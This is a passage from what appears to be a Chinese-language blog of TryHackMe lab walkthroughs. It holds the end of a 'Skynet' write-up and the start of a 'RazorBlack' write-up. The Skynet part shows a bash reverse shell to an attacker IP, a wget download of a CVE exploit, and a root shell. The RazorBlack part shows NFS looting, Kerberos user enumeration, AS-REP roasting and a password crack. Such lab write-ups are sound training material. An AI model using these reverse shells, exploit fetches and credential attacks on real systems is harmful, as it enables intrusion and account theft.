src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720223727997.png" alt="image-20220720223727997"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&#x27;exec bash -i &amp;&gt;/dev/tcp/10.14.24.91/1337 &lt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F10.14.24.91%2F1337%20%3C%261%27<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220720224048199.png" alt="image-20220720224048199"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB/notes$ nc -lvnp 1337                 <br>listening on [any] 1337 ...<br>connect to [10.14.24.91] from (UNKNOWN) [10.10.27.117] 49280<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1287): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@skynet:/var/www/html/45kra24zxs28v3yd/administrator/alerts$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/home/milesdyson$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/sbin/mount.cifs<br>/bin/mount<br>/bin/fusermount<br>/bin/umount<br>/bin/ping<br>/bin/su<br>/bin/ping6<br>/usr/bin/passwd<br>/usr/bin/sudo<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/pkexec<br>/usr/bin/chsh<br>/usr/bin/newgidmap<br>/usr/bin/at<br>/usr/bin/newuidmap<br>/usr/bin/chfn<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/snapd/snap-confine<br>/usr/lib/openssh/ssh-keysign<br>www-data@skynet:/home/milesdyson$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/tmp$ wget http://10.14.24.91/CVE-2021-2043.py<br>wget http://10.14.24.91/CVE-2021-2043.py<br>--2022-07-20 09:44:05--  http://10.14.24.91/CVE-2021-2043.py<br>Connecting to 10.14.24.91:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3448 (3.4K) [text/x-python]<br>Saving to: <span class="hljs-string">&#x27;CVE-2021-2043.py&#x27;</span><br><br>     0K ...                                                   100% 1009K=0.003s<br><br>2022-07-20 09:44:06 (1009 KB/s) - <span class="hljs-string">&#x27;CVE-2021-2043.py&#x27;</span> saved [3448/3448]<br><br>www-data@skynet:/tmp$ python3 ./CVE-2021-2043.py<br>python3 ./CVE-2021-2043.py<br><span class="hljs-built_in">ls</span><br>GCONV_PATH=.<br>gconv<br>pwn.so<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br><span class="hljs-built_in">cat</span> /root/root.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TryHackMe Walkthrough - RazorBlack</title>
    <link href="/post/TryHackMe-RazorBlack.html"/>
    <url>/post/TryHackMe-RazorBlack.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Sun Jun 26 03:01:18 2022 as: nmap -sC -sV -Pn -p- -T4 -O -oA nmap.txt 10.10.104.184</span><br>Warning: 10.10.104.184 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (6).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.104.184<br>Host is up (0.30s latency).<br>Not shown: 65507 closed tcp ports (reset)<br>PORT      STATE SERVICE            VERSION<br>53/tcp    open  domain             Simple DNS Plus<br>88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2022-06-25 19:18:49Z)<br>111/tcp   open  rpcbind            2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/tcp6  rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  2,3,4        111/udp6  rpcbind<br>|   100003  2,3         2049/udp   nfs<br>|   100003  2,3         2049/udp6  nfs<br>|   100003  2,3,4       2049/tcp   nfs<br>|   100003  2,3,4       2049/tcp6  nfs<br>|   100005  1,2,3       2049/tcp   mountd<br>|   100005  1,2,3       2049/tcp6  mountd<br>|   100005  1,2,3       2049/udp   mountd<br>|   100005  1,2,3       2049/udp6  mountd<br>|   100021  1,2,3,4     2049/tcp   nlockmgr<br>|   100021  1,2,3,4     2049/tcp6  nlockmgr<br>|   100021  1,2,3,4     2049/udp   nlockmgr<br>|   100021  1,2,3,4     2049/udp6  nlockmgr<br>|   100024  1           2049/tcp   status<br>|   100024  1           2049/tcp6  status<br>|   100024  1           2049/udp   status<br>|_  100024  1           2049/udp6  status<br>135/tcp   open  msrpc              Microsoft Windows RPC<br>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn<br>389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  tcpwrapped<br>2049/tcp  open  mountd             1-3 (RPC <span class="hljs-comment">#100005)</span><br>3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)<br>3269/tcp  open  tcpwrapped<br>3389/tcp  open  ssl/ms-wbt-server?<br>| rdp-ntlm-info: <br>|   Target_Name: RAZ0RBLACK<br>|   NetBIOS_Domain_Name: RAZ0RBLACK<br>|   NetBIOS_Computer_Name: HAVEN-DC<br>|   DNS_Domain_Name: raz0rblack.thm<br>|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm<br>|   Product_Version: 10.0.17763<br>|_  System_Time: 2022-06-25T19:20:39+00:00<br>| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm<br>| Not valid before: 2022-06-24T19:00:18<br>|_Not valid after:  2022-12-24T19:00:18<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-06-25T19:20:47+00:00; 0s from scanner time.<br>5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>9389/tcp  open  mc-nmf             .NET Message Framing<br>47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>49664/tcp open  msrpc              Microsoft Windows RPC<br>49665/tcp open  msrpc              Microsoft Windows RPC<br>49667/tcp open  msrpc              Microsoft Windows RPC<br>49669/tcp open  msrpc              Microsoft Windows RPC<br>49674/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0<br>49675/tcp open  msrpc              Microsoft Windows RPC<br>49676/tcp open  msrpc              Microsoft Windows RPC<br>49679/tcp open  msrpc              Microsoft Windows RPC<br>49694/tcp open  msrpc              Microsoft Windows RPC<br>49708/tcp open  msrpc              Microsoft Windows RPC<br>49850/tcp open  msrpc              Microsoft Windows RPC<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://google.com/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.92SVN%E=4%D=6/26%OT=53%CT=1%CU=42583%PV=Y%DS=2%DC=I%G=Y%TM=62B7<br>OS:60EC%P=x86_64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=I%CI=I%II=I%<br>OS:SS=S%TS=U)OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M5<br>OS:06NW8NNS%O6=M506NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)<br>OS:ECN(R=Y%DF=Y%T=80%W=FFFF%O=M506NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%<br>OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=<br>OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%<br>OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=<br>OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=<br>OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%<br>OS:T=80%CD=Z)<br><br>Network Distance: 2 hops<br>Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-06-25T19:20:41<br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br><br>OS and Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Sun Jun 26 03:24:28 2022 -- 1 IP address (1 host up) scanned in 1390.21 seconds</span><br></code></pre></td></tr></table></figure><p>先获取一个合法域身份。可以从445入手，但被拒绝了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$smbmap</span> -H 10.10.104.184 -u hello<br>[!] Authentication error on 10.10.104.184<br></code></pre></td></tr></table></figure><p>尝试匿名LDAP：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$ldapsearch</span>-ad.py -l 10.10.104.184 -t info<br><span class="hljs-comment">### Server infos ###</span><br>[+] Forest functionality level = Windows 2016<br>[+] Domain functionality level = Windows 2016<br>[+] Domain controller functionality level = Windows 2016<br>[+] rootDomainNamingContext = DC=raz0rblack,DC=thm<br>[+] defaultNamingContext = DC=raz0rblack,DC=thm<br>[+] ldapServiceName = raz0rblack.thm:haven-dc<span class="hljs-variable">$@RAZ0RBLACK</span>.THM<br>[+] naming_contexts = [<span class="hljs-string">&#x27;DC=raz0rblack,DC=thm&#x27;</span>, <span class="hljs-string">&#x27;CN=Configuration,DC=raz0rblack,DC=thm&#x27;</span>, <span class="hljs-string">&#x27;CN=Schema,CN=Configuration,DC=raz0rblack,DC=thm&#x27;</span>, <span class="hljs-string">&#x27;DC=DomainDnsZones,DC=raz0rblack,DC=thm&#x27;</span>, <span class="hljs-string">&#x27;DC=ForestDnsZones,DC=raz0rblack,DC=thm&#x27;</span>]<br></code></pre></td></tr></table></figure><p>Windows 2016：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$ldapsearch</span> -x -b <span class="hljs-string">&quot;dc=raz0rblack,dc=thm&quot;</span> -H ldap://10.10.104.184<br><span class="hljs-comment"># extended LDIF</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># LDAPv3</span><br><span class="hljs-comment"># base &lt;dc=raz0rblack,dc=thm&gt; with scope subtree</span><br><span class="hljs-comment"># filter: (objectclass=*)</span><br><span class="hljs-comment"># requesting: ALL</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-comment"># search result</span><br>search: 2<br>result: 1 Operations error<br>text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera<br> tion a successful <span class="hljs-built_in">bind</span> must be completed on the connection., data 0, v4563<br><br><span class="hljs-comment"># numResponses: 1</span><br></code></pre></td></tr></table></figure><p>没什么东西。从Nmap返回信息中能看到RPC是有东西的，而且目标开放了2049端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$showmount</span> -e 10.10.104.184<br>Export list <span class="hljs-keyword">for</span> 10.10.104.184:<br>/users (everyone)<br><span class="hljs-variable">$mkdir</span> <span class="hljs-built_in">users</span><br><span class="hljs-variable">$sudo</span> mount -t nfs 10.10.104.184:/users /home/mosaic/tmp/users<br><span class="hljs-variable">$sudo</span> <span class="hljs-built_in">ls</span> <span class="hljs-built_in">users</span>/<br>employee_status.xlsx  sbradley.t<br><span class="hljs-variable">$sudo</span> <span class="hljs-built_in">cp</span> <span class="hljs-built_in">users</span>/* .<br><span class="hljs-variable">$cat</span> sbradley.txt <br>��THM&#123;ab53.........................&#125;<br></code></pre></td></tr></table></figure><p>另一个xlsx文件中会有一些用户名：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220626034914073.png" alt="image-20220626034914073"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$cat</span> user<br>daven port<br>imogen royce<br>tamara vidal<br>arthur edwards<br>carl ingram<br>nolan cassidy<br>reza zaydan<br>ljudmila vetrova<br>rico delgado<br>tyson williams<br>steven bradley<br>chamber lin<br></code></pre></td></tr></table></figure><p>可以自由组合生成更多用户名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$namemash</span>.py user &gt; users.txt<br><span class="hljs-variable">$cat</span> users.txt <br>davenport<br>portdaven<br>daven.port<br>port.daven<br>portd<br>dport<br>pdaven<br>d.port<br>p.daven<br>daven<br>port<br>imogenroyce<br>royceimogen<br>imogen.royce<br>royce.imogen<br>roycei<br>iroyce<br>rimogen<br>i.royce<br>r.imogen<br>imogen<br>royce<br>tamaravidal<br>vidaltamara<br>tamara.vidal<br>vidal.tamara<br>vidalt<br>tvidal<br>vtamara<br>t.vidal<br>v.tamara<br>tamara<br>vidal<br>arthuredwards<br>edwardsarthur<br>arthur.edwards<br>edwards.arthur<br>edwardsa<br>aedwards<br>earthur<br>a.edwards<br>e.arthur<br>arthur<br>edwards<br>carlingram<br>ingramcarl<br>carl.ingram<br>ingram.carl<br>ingramc<br>cingram<br>icarl<br>c.ingram<br>i.carl<br>carl<br>ingram<br>nolancassidy<br>cassidynolan<br>nolan.cassidy<br>cassidy.nolan<br>cassidyn<br>ncassidy<br>cnolan<br>n.cassidy<br>c.nolan<br>nolan<br>cassidy<br>rezazaydan<br>zaydanreza<br>reza.zaydan<br>zaydan.reza<br>zaydanr<br>rzaydan<br>zreza<br>r.zaydan<br>z.reza<br>reza<br>zaydan<br>ljudmilavetrova<br>vetrovaljudmila<br>ljudmila.vetrova<br>vetrova.ljudmila<br>vetroval<br>lvetrova<br>vljudmila<br>l.vetrova<br>v.ljudmila<br>ljudmila<br>vetrova<br>ricodelgado<br>delgadorico<br>rico.delgado<br>delgado.rico<br>delgador<br>rdelgado<br>drico<br>r.delgado<br>d.rico<br>rico<br>delgado<br>tysonwilliams<br>williamstyson<br>tyson.williams<br>williams.tyson<br>williamst<br>twilliams<br>wtyson<br>t.williams<br>w.tyson<br>tyson<br>williams<br>stevenbradley<br>bradleysteven<br>steven.bradley<br>bradley.steven<br>bradleys<br>sbradley<br>bsteven<br>s.bradley<br>b.steven<br>steven<br>bradley<br>chamberlin<br>linchamber<br>chamber.lin<br>lin.chamber<br>linc<br>clin<br>lchamber<br>c.lin<br>l.chamber<br>chamber<br>lin<br></code></pre></td></tr></table></figure><h4 id="ASREProast"><a href="#ASREProast" class="headerlink" title="ASREProast:"></a>ASREProast:</h4><p>然后可以先枚举一下存在的用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$kerbrute</span> userenum users.txt --dc 10.10.104.184 -d raz0rblack -o user.txt<br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: v1.0.3 (9dad6e1) - 06/26/22 - Ronnie Flathers @ropnop<br><br>2022/06/26 03:54:09 &gt;  Using KDC(s):<br>2022/06/26 03:54:09 &gt;  10.10.104.184:88<br><br>2022/06/26 03:54:13 &gt;  [+] VALID USERNAME: lvetrova@raz0rblack<br>2022/06/26 03:54:13 &gt;  [+] VALID USERNAME: twilliams@raz0rblack<br>2022/06/26 03:54:14 &gt;  [+] VALID USERNAME: sbradley@raz0rblack<br>2022/06/26 03:54:15 &gt;  Done! Tested 132 usernames (3 valid) <span class="hljs-keyword">in</span> 5.716 seconds<br><br><span class="hljs-variable">$cat</span> user.txt | grep VALID | awk <span class="hljs-string">&#x27;&#123;print $7&#125;&#x27;</span> &gt; newuser<br><span class="hljs-variable">$cat</span> newuser <br>lvetrova@raz0rblack<br>twilliams@raz0rblack<br>sbradley@raz0rblack<br></code></pre></td></tr></table></figure><p>然后枚举禁用预认证用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$GetNPUsers</span>.py <span class="hljs-string">&#x27;raz0rblack/&#x27;</span> -usersfile newuser -request -format hashcat -no-pass -dc-ip 10.10.104.184 -outputfile ASREProastables.txt<br>Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation<br><br>[-] User lvetrova@raz0rblack doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User sbradley@raz0rblack doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br><br><span class="hljs-variable">$cat</span> ASREProastables.txt <br>$krb5asrep$23<span class="hljs-variable">$twilliams</span>@raz0rblack@RAZ0RBLACK:71e4f9759482a6fbc65c6dc0cb733ad2<span class="hljs-variable">$8900392465311f4c0a7a894954c0ed1cb47d0396ae3734c1b3871576e5bf198f72343f68123ef18bcd879502f4094051a2ac6bc4d8e17e2605ed34946df5ea5ff2f7a8bb567505e469c43495494608a8ecf6768eb43f8621ba5c506d473ad7d1ed2f93768210bc6520694c041dde4e85b6bc308de3c9d47007de1c1476747f4091c3ea2037d71b30dd7980ca8cff9f62e182f9c3454dc901c1d659ddf165d7c603098e93c0d0a1b9c12f6bf8e3500a04b74740fe7e6bbf6f161aa55c950cad22d89857a43301c04fb948524c8c9d278d5456b1e3ec30d6e5003d5ea395f5079f8ea54ee738e3483483022eaa</span><br><br><span class="hljs-variable">$hashcat</span> -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 204 MB<br><br>Dictionary cache hit:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344385<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br><br>$krb5asrep$23<span class="hljs-variable">$twilliams</span>@raz0rblack@RAZ0RBLACK:71e4f9759482a6fbc65c6dc0cb733ad2<span class="hljs-variable">$8900392465311f4c0a7a894954c0ed1cb47d0396ae3734c1b3871576e5bf198f72343f68123ef18bcd879502f4094051a2ac6bc4d8e17e2605ed34946df5ea5ff2f7a8bb567505e469c43495494608a8ecf6768eb43f8621ba5c506d473ad7d1ed2f93768210bc6520694c041dde4e85b6bc308de3c9d47007de1c1476747f4091c3ea2037d71b30dd7980ca8cff9f62e182f9c3454dc901c1d659ddf165d7c603098e93c0d0a1b9c12f6bf8e3500a04b74740fe7e6bbf6f161aa55c950cad22d89857a43301c04fb948524c8c9d278d5456b1e3ec30d6e5003d5ea395f5079f8ea54ee738e3483483022eaa</span>:roastpotatoes<br><br><span class="hljs-variable">$echo</span> roastpotatoes &gt; passwd<br><span class="hljs-variable">$echo</span> twilliams &gt; user.txt<br></code></pre></td></tr></table></figure><p>然后可以看一看共享，当然也可以尝试直接走winrm登录上去。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span 